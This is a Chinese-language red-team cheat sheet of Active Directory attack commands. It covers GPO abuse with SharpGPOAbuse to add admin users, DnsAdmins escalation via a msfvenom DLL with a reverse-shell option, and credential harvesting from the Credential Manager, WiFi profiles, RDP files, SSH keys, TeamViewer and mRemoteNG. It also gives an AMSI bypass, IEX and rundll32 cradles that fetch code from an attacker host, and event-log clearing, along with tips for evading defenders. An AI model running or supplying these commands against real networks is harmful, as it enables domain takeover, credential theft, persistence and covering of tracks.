来源:SharpGPOAbuse(GitHub FSecureLABS/SharpGPOAbuse,C# 源码需 Visual Studio 自编译,官方不发布成品;参数以下载的 README 为准);枚举用本机 PowerView——**实测 3.0 版只有 Get-DomainGPO/Get-GPODelegation/Get-DomainOU 等枚举函数,没有老 cheat sheet 里的 New-GPOImmediateTask(那是 PowerView 2.x 旧函数),写操作走 SharpGPOAbuse**

前提:当前用户对某 GPO 有编辑权(GenericAll/WriteDacl/Owner,`Get-GPODelegation` 一条命令找全域可写 GPO 的用户;BloodHound 的 GPO 相关边同理)。

```powershell
# ===== 枚举:找可滥用 GPO 与作用范围 =====
Get-GPODelegation                              # 全域:谁对 GPO 有写权限(输出即滥用入口)
Get-DomainGPO -Properties displayname,name     # GPO 显示名 ↔ GUID(name 属性就是 {GUID})
Get-DomainOU -GPLink <GPO的GUID>               # 反查该 GPO 链到哪些 OU → 定向目标机器清单
# SharpGPOAbuse 改的是 GPO 本体:GPO 挂哪个 OU,任务就在那个 OU 的机器上跑
```

```bat
:::: 利用(SharpGPOAbuse.exe 需自编译;C2 里 execute-assembly 或按文件传输小节落地):
:::: 计算机立即任务:GPO 作用域内所有机器以 SYSTEM 执行,等 GPO 刷新(默认最长约 2 小时)或目标机 gpupdate /force
SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" --Author "<域名>\administrator" --Command "cmd.exe" --Arguments "/c net user <新增用户> <密码> /add && net localgroup administrators <新增用户> /add" --GPOName "<GPO显示名>"
:::: 只打 GPO 作用域内某一台机器(定向,减小动静):
SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" --Author "<域名>\administrator" --Command "cmd.exe" --Arguments "/c <命令>" --GPOName "<GPO显示名>" --FilterEnabled --TargetDnsName <目标机器FQDN>
```

参数速查:
- `--AddComputerTask` 计算机立即任务(SYSTEM 权限);`--AddUserTask` 用户立即任务(配 `--TargetUsername <域>\<用户>` 定向)
- `--GPOName "<显示名>"` 目标 GPO(也可 `--GPOGuid`);`--Author "<域>\<账户>"` 伪装的任务作者(填域管名迷惑蓝队)
- `--Command <程序> --Arguments <参数>` 执行内容;`--TaskName <名>` 计划任务名(伪装成更新类)
- `--FilterEnabled --TargetDnsName <FQDN>` 只在指定机器触发
- 其他攻击型:`--AddLocalAdmin`(作用域机器批量加本地管理员)、`--AddComputerScript`/`--AddUserScript`(启动/登录脚本)
- `--Domain <域名> --DomainController <域控>` 显式指定;`--Force` 覆盖已有文件
- 目标机 `gpupdate /force` 立即触发,不等默认刷新周期

注意: 改 GPO = 直接改 DC 的 SYSVOL(`\\<域名>\SysVol\<域名>\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml` + GPT.ini 版本号)并留 5136/5145 事件;SharpGPOAbuse **没有自动清理**——收尾必须用 gpmc.msc(组策略管理编辑器)删掉该立即任务、或手工删 ScheduledTasks.xml 并回滚 GPT.ini 版本号,别把"更新任务"留在全作用域机器上;一改全作用域生效,生产环境优先 `--FilterEnabled` 定向单机;等不及刷新就到目标机执行 gpupdate /force(多一条日志,自行权衡)。

---

## DnsAdmins 提权 — DLL 加载到 DNS 服务 = SYSTEM

来源:Shay Ber 原始研究 + Nikhil Mittal《Abusing DnsAdmins privilege for escalation in AD》(微软 2021-11 认定并修补为 CVE-2021-40469);dnscmd/sc 为 Windows 自带;共享用 impacket-smbserver(见文首小节)

前提:当前用户(或可借票据的账户)是 **DnsAdmins** 组成员。DNS 服务多数跑在 DC 上且以 SYSTEM 运行——插件 DLL 一加载就是 DC 的 SYSTEM。

```bash
# 攻击机:生成恶意 DLL(必须 64 位,DC 的 dns.exe 是 x64);exec 落用户最稳,反弹 shell 同理
msfvenom -p windows/x64/exec CMD='net user <新增用户> <密码> /add && net localgroup administrators <新增用户> /add' -f dll -o /tmp/evil.dll
# 起共享供 DC 回连读取(匿名版常被拒,-username/-password 更稳,见文首)
impacket-smbserver share /tmp -smb2support
```

```bat
:::: 1. 确认成员身份(域内任意机器)
whoami /groups | findstr /i "DnsAdmins"
:::: 2. 注册恶意 DLL(UNC 或 DC 本地路径均可;本质是写 HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters)
dnscmd <DC主机名> /config /serverlevelplugdll \\<攻击机IP>\share\evil.dll
:::: 3. 重启 DNS 服务加载 DLL(远程 sc 需对 DC 有管理员权限;DnsAdmins 在 DC 本地会话可直接重启)
sc \\<DC主机名> stop dns
sc \\<DC主机名> start dns
:::: 4. 打完清理:置空插件再重启一次,别让 DC 下次启动还加载你的 DLL
dnscmd <DC主机名> /config /serverlevelplugdll ""
sc \\<DC主机名> stop dns && sc \\<DC主机名> start dns
```

参数速查:
- `dnscmd <DC> /config /serverlevelplugdll <路径>` 注册服务级插件 DLL(ired.team 亦拼作 `/serverlevelplugindll`,同指注册表值 ServerLevelPluginDll)
- `sc \\<DC> stop|start dns` 重启加载;`sc \\<DC> query dns` 看状态
- 验证(DC 本地):`Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters -Name ServerLevelPluginDll`
- `msfvenom -p windows/x64/exec CMD='<命令>' -f dll` 与 dns.exe 同架构;反弹版 `windows/x64/shell_reverse_tcp LHOST=<攻击机IP> LPORT=<端口>`
- 蓝队可见日志:DNS 服务器日志事件 770(加载成功)/150(失败)、审计日志 541;ServerLevelPluginDll 注册表变动本身也被监控

注意: 2021-11 补丁(CVE-2021-40469)后部分环境已封此路,先实测;重启 DNS = 全域解析抖动,动静大,动作要快;UNC 加载要求 DC 能访问你的共享(别指向 C$ 之类管理共享);DLL 路径与文件名完全自定义——伪装思路:把恶意 DLL 改名成 dbghelp.dll 之类系统常见模块名再注册加载,蓝队排查模块加载链时更不显眼;也可改造 mimikatz 开源的 mimilib.dll(实现 DnsPluginInitialize,加载后把 DNS 查询记录到 kiwidns.log 并可执行命令);**收尾必须置空 serverlevelplugdll 并再重启服务**,否则你的 DLL 永久挂在 DC 启动链上——既是后门也是把柄。

---

## 凭据收集面扩大 — 凭据管理器/WiFi/RDP/SSH/远控软件里的存量密码

来源:系统自带(cmdkey、netsh、mstsc、sc)+ mimikatz vault::/dpapi::/ts:: 模块(vault::cred、vault::list、dpapi::cred、dpapi::blob、ts::mstsc 均已对本机 mimikatz.exe strings -el 实证)+ 本机 Metasploit post 模块(post/windows/gather/credentials/mremote、teamviewer_passwords,实测存在于 /usr/share/metasploit-framework)

场景:mimikatz 常规转储之外,机器上还散落着大量"保存过密码":凭据管理器、WiFi、RDP 连接文件、SSH 私钥、远控软件配置——下面六个面逐一收割。

### Windows 凭据管理器 — cmdkey 定位 + vault::cred / dpapi::cred 解密

```bat
:::: cmdkey(系统自带,非管理员即可列当前用户已存凭据的目标;密码不显示,只给"存在哪")
cmdkey /list                                  :: 全部:TERMSRV/*=RDP、Domain:target=*=SMB、普通 Web 凭据
cmdkey /list | findstr /i "TERMSRV"           :: 只看保存了密码的 RDP 目标(横向清单)
```

```bash
# === 进入 mimikatz 后执行(需管理员)===
vault::list           # 列 Vault(IE/Edge 旧版 Web 凭据;要求 VaultSvc 服务可启动)
vault::cred /patch    # 补丁 VaultSvc 进程导出 Web 凭据明文(vault::cred 已 strings 实证)
# Windows 凭据(通用凭据)是 DPAPI blob,解密接上文 DPAPI 节:
#   现场:sekurlsa::dpapi 缓存主密钥后 → dpapi::cred /in:"C:\Users\<用户名>\AppData\Roaming\Microsoft\Credentials\<文件>"
#   离线:攻击机 impacket-dpapi credential -file <blob> -key <主密钥hex>(全流程见 DPAPI 域备份密钥节)
```

### WiFi — netsh wlan 导出明文密钥

```bat
netsh wlan show profiles                               :: 列所有已保存 SSID
netsh wlan show profile name="<SSID>" key=clear        :: 单个:"关键内容"即明文密码(需管理员)
netsh wlan export profile folder=C:\Temp key=clear     :: 全量导出 XML 且密钥为明文(需管理员;folder 需已存在)
:::: 底层文件(密文存放处):C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\<网卡GUID>\*.xml
```

### mstsc 保存连接 — .rdp 文件与 cmdkey 的关系

```bat
dir /a:h "%USERPROFILE%\Documents\Default.rdp"         :: 隐藏的默认连接文件(有=该机常连别人)
cmdkey /list | findstr /i "TERMSRV"                    :: 新版 mstsc 勾"记住密码"→ 存进凭据管理器而非 .rdp
type "%USERPROFILE%\Documents\Default.rdp" | findstr /i "full address username"
:::: 旧版 .rdp 内嵌 password 51:b:<hex> 段 = DPAPI blob,拖回来用 mimikatz 解:
```

```bash
# === 进入 mimikatz 后执行(先 sekurlsa::dpapi 缓存主密钥,再解 .rdp 里的 51:b blob)===
dpapi::blob /in:C:\Temp\Default.rdp        # dpapi::blob 已实证;实际按 blob 单独存出文件解
ts::mstsc                                  # 实验性:直接从运行中的 mstsc.exe 进程抓保存的凭据
```

```bat
:::: 预埋凭据(横向跳板):给目标 TERMSRV 存一份密码,mstsc 打开即自动登录
cmdkey /generic:TERMSRV/<目标IP或主机名> /user:<域名>\<用户> /pass:<密码>
cmdkey /delete:TERMSRV/<目标IP或主机名>    :: 收尾删除
```

### SSH — agent 复用与 .ssh 私钥拾取

```bat
:::: Windows 目标(OpenSSH for Windows 装机已常见)
dir /b /s C:\Users\*\.ssh 2>nul             :: 各用户 .ssh:id_rsa/id_ed25519 私钥、known_hosts、authorized_keys
dir /b C:\ProgramData\ssh 2>nul             :: 系统级:sshd_config、administrators_authorized_keys
sc query ssh-agent                         :: ssh-agent 服务 Running = 该用户内存里有已加载私钥
ssh-add -l                                 :: 以该用户身份列 agent 里的私钥指纹(每行末尾是 key 注释)
```

```bash
# 攻击机:私钥拖回(走 13 文件传输小节)直接横向;known_hosts 是"它连过谁"的目标清单
chmod 600 id_rsa && ssh -i id_rsa <用户>@<下一跳目标>
# Windows ssh-agent 的钥匙持久化在注册表 HKCU\Software\OpenSSH\Agent\Keys(DPAPI 按用户加密,
# 须以该用户/SYSTEM 上下文才能解,管理员直接 reg save 拖回离线攻)
# 往目标 authorized_keys 追加自公钥 = 免密后门(持久化动作,报告注明并收尾删行)
```

### mRemoteNG / TeamViewer — 远控软件配置收割

```bat
:::: mRemoteNG:连接库 XML,Password 属性为 AES 加密(默认"custom password"模式可离线解)
dir /b "%APPDATA%\mRemoteNG\confCons.xml" 2>nul
:::: 老版 mRemote 同款位置:
dir /b "%LOCALAPPDATA%\Felix_Deimel\mRemote\confCons.xml" 2>nul
:::: TeamViewer(64 位系统装 32 位 TV,注册表在 WOW6432Node;版本子键 Version7~15)
reg query "HKLM\SOFTWARE\WOW6432Node\TeamViewer" /s
reg query "HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version<版本号>" /v SecurityPasswordAES
reg query "HKLM\SOFTWARE\TeamViewer" /s 2>nul    :: 少数装在非重定向路径
```

解密工具(给名不虚构参数,以各自 README/模块 info 为准):
- mRemoteNG:harmj0y 的 mremoteng-decrypt(解 confCons.xml 的 Password 属性)
- 双料自动收割:msf post 模块 `post/windows/gather/credentials/mremote` 与 `post/windows/gather/credentials/teamviewer_passwords`(本机 /usr/share/metasploit-framework 实测存在)
- TeamViewer 旧版(<v9 线)SecurityPasswordAES 用内置密钥可离线解;新版已加固,版本分界以工具仓库说明为准 [待验证]

参数速查:
- `cmdkey /list` 列;`/generic:TERMSRV/<目标> /user: /pass:` 预埋;`/delete:<目标>` 删
- `netsh wlan export profile folder=<目录> key=clear` 全量明文导出;`show profile name=<SSID> key=clear` 单个
- `vault::cred /patch` 补丁 VaultSvc 导出;`vault::list` 列 Vault;`dpapi::cred /in:<文件>` 解通用凭据 blob
- `dpapi::blob /in:<文件>` 解任意 DPAPI blob(含 .rdp 的 password 51:b 段);`ts::mstsc` 从 mstsc 进程抓
- 材料:%APPDATA%\Microsoft\Credentials\ 与 %LOCALAPPDATA%\Microsoft\Credentials\(通用凭据 blob)、%APPDATA%\mRemoteNG\confCons.xml、HKLM\SOFTWARE\WOW6432Node\TeamViewer\

注意: WiFi/导出类命令需管理员;cmdkey 只见目标不见密码,拿明文必走 DPAPI/vault 链(密钥材料见上文 DPAPI 节);GPO 可禁 mstsc 存密码(策略"不允许保存密码",注册表 HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services 的 fDenySavePasswords),遇到 TERMSRV 列表为空先想到这层;authorized_keys 追加与 TERMSRV 预埋都是留痕持久的动作,收尾清单里必须带上。

---

## 免杀与 OPSEC — AMSI 绕过思路、编码执行、rundll32 与日志清理

来源:公开技术思路整理(全部系统自带能力,无现成工具)

```powershell
# ===== AMSI 绕过思路:给 amsiInitFailed 打补丁(公开 POC;用字符串拼接打散静态特征)=====
[Ref].Assembly.GetType('System.Management.Automation.'+'AmsiUtils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)
# 下载 cradle 的双引号混淆:整段包成字符串再 IEX,叠加拼接隐藏关键字
IEX ("IE"+"X (irm http://<攻击机IP>:8080/PowerView.ps1)")
# 以上对旧版 Defender 有效;新版(行为引擎+ETW)基本拦,那就换系统自带条子或 exe 类工具
```

```bash
# ===== powershell -enc:UTF-16LE Base64 编码执行(命令行审计看不到明文)=====
echo -n 'IEX (irm http://<攻击机IP>:8080/PowerView.ps1)' | iconv -t UTF-16LE | base64 -w0   # Kali 生成编码串
```

```bat
::: 目标机:-EncodedCommand 只认 UTF-16LE 的 base64,把上一步输出粘进来
powershell -enc <编码串>
```

```bat
::: ===== rundll32 执行思路(LOLBAS:微软签名程序,常用于绕"白名单外禁止执行"策略)=====
::: 经典 javascript COM 脚本执行(需出网;如今多数被盯,但常能绕应用白名单)
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:http://<攻击机IP>:8080/x.wsc")
::: 执行 DLL 导出函数(自己的 implant DLL 或带导出接口的工具)
rundll32.exe C:\Temp\tool.dll,Start
```

```bat
::: ===== 日志:位置与清理 =====
::: 关键日志(事件查看器 eventvwr.msc):Security(4624 登录成功 / 4672 特权登录 / 4688 进程创建)
::: "Windows PowerShell"(4104 脚本块日志)、Microsoft-Windows-Sysmon/Operational(装了才有)
wevtutil el                          :: 列出全部日志通道名(找自定义采集日志)
wevtutil qe Security /c:5 /rd:true /f:text    :: 不开界面看最近 5 条安全日志
wevtutil cl Security                 :: 清空安全日志(慎重!)
wevtutil cl "Windows PowerShell"     :: 清 PowerShell 日志
```

```bash
# === mimikatz 侧日志操作(进入 mimikatz 后执行;两命令均已对本机 mimikatz.exe strings 实证)===
event::drop    # 实验性:补丁事件服务,动作期间不再写入新事件(免留痕,优于事后清空)
event::clear   # 清一条日志:event::clear <日志名> —— 与 wevtutil cl 等价,同样留 1102
```

参数速查:
- `powershell -enc <UTF16LE的base64>` 编码执行;`-ep bypass` 绕执行策略;`-nop`(-NoProfile)不加载配置;`-w hidden` 隐藏窗口——常用四连
- `wevtutil el|qe|cl` 列出/查询/清空;`qe <日志> /c:<条数> /rd:true /f:text` 倒序文本查询
- mimikatz `event::drop`(实验性,压制新事件写入)/ `event::clear <日志名>`(清单条,同留 1102)——交互环境内执行
- rundll32 `javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:<url>")` COM 脚本执行
- rundll32 `<DLL>,<导出函数>` 执行 DLL 导出
- 事件 ID:4624 登录成功 · 4672 特权登录 · 4688 进程创建 · 1102 日志被清 · 4104 PS 脚本块

注意: **清空日志本身会留 1102(日志清除)事件,等于"此地无银"**——红队原则是少留而非删:用系统自带条子代替 ps1、-enc 代替明文、native exe 代替脚本;AMSI 补丁一句话对新版 Defender 大多失效,思路价值大于实战价值,可靠路线是自编译/加载器分阶段(见 03 的 msfvenom/Empire);开了 PowerShell 深度日志(转录/模块日志)的环境里任何 PS 操作都有副本,别恋战,尽早转 native exe。
